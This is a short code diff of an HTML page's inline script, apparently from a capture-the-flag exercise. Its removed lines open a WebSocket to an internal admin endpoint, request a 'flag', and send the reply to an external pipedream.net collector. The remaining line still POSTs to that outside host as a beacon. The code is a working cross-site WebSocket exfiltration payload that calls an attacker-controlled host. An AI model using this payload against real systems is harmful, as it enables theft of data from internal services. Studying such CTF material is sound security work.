@@ -8,15 +8,6 @@
     <script>
       const url = encodeURI("https://eorokvtrcf7mllf.m.pipedream.net/");
       await fetch(url, {method: "POST"});
-      const websocket = new WebSocket("ws://web:8080/admin/ws");
-      websocket.onopen = () => {
-        websocket.send("flag");
-      };
-      websocket.onmessage = async (message) => {
-        const flag = message.data;
-        const url = encodeURI("https://eorokvtrcf7mllf.m.pipedream.net/" + flag);
-        await fetch(url, {method: "POST"});
-      };
     </script>
   </head>
   <body>
